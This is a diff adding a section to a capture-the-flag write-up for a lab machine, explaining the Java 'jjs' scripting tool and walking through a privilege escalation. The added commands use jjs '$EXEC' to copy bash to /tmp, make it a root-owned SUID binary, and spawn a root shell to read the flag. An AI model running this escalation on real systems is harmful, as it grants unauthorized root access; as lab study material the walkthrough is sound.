@@ -549,13 +549,63 @@ Going through the list, we find the "jjs" binary. Looking on GTFObins, there is 
 
 {% embed url="https://gtfobins.github.io/gtfobins/jjs" %}
 
+What exactly is "jjs". The below explanation was taken from the referenced site:
 
+{% hint style="info" %}
+The Nashorn Javascript Engine is part of Java SE 8 and competes with other standalone engines like Google V8 (the engine that powers Google Chrome and Node.js). Nashorn extends Javas capabilities by running dynamic javascript code natively on the JVM.
 
+The Nashorn javascript engine can either be used programmatically from java programs or by utilizing the command line tool jjs.
 
+[https://winterbe.com/posts/2014/04/05/java8-nashorn-tutorial/](https://winterbe.com/posts/2014/04/05/java8-nashorn-tutorial/)
+{% endhint %}
 
+A google search for ""jjs" suid" finds the following article, which relates mostly to running the tool on Windows, but does have some Linux examples as well. The article indicates that we could use "jjs" to get a shell, which is perfect for our scenario, as we are attempting to get a shell as root.
 
+{% embed url="https://cornerpirate.com/2018/08/17/java-gives-a-shell-for-everything" %}
 
+Despite all the good information in the above article, I decided to have a look at the "jjs" documentation at the following page:
 
+{% embed url="https://docs.oracle.com/javase/8/docs/technotes/guides/scripting/nashorn/shell.html" %}
+
+According to the above page, if we run the command "jjs -scripting" it will give us an interactive prompt which includes several global objects, one of which is "$EXEC()". This function will allow us to run OS commands from within the "jjs" environment.
+
+Let's test it:
+
+```
+admin@mango:/home/admin$ jjs -scripting
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> $EXEC("id")
+uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
+
+jjs> quit()
+admin@mango:/home/mango$
+```
+
+Nice, our effective user ID is root. Let's use this vulnerability to get a root shell.
+
+To do so, I'll copy "/bin/bash" to "/tmp/", run "chown" and "chmod" on it to change the ownership to "root" and to make it a SUID binary.&#x20;
+
+```
+admin@mango:/home/mango$ jjs -scripting
+Warning: The jjs tool is planned to be removed from a future JDK release
+jjs> $EXEC("cp /bin/bash /tmp/r00t; chown root:root /tmp/r00t; chmod u+s /tmp/r00t")
+
+jjs> quit()
+admin@mango:/home/mango$ ls -la /tmp/r00t
+-rwsr-xr-x 1 root root 1113504 Nov 18 15:43 /tmp/r00t
+admin@mango:/home/mango$
+```
+
+All we need to do now is run the new SUID binary and grab the root flag.
+
+```
+admin@mango:/home/mango$ /tmp/r00t -p
+r00t-4.4# id
+uid=4000000000(admin) gid=1001(admin) euid=0(root) groups=1001(admin)
+r00t-4.4# cat /root/root.txt
+35d0be95f135d7c9c4c3f58c20b6e978
+r00t-4.4#
+```
 
 ## Resources
 
@@ -569,7 +619,7 @@ Mongodb is a NoSQL database which stores documents using the JSON format. For mo
 
 {% embed url="https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf" %}
 
-
+{% embed url="https://h4wkst3r.blogspot.com/2018/05/code-execution-with-jdk-scripting-tools.html" %}
 
 
 
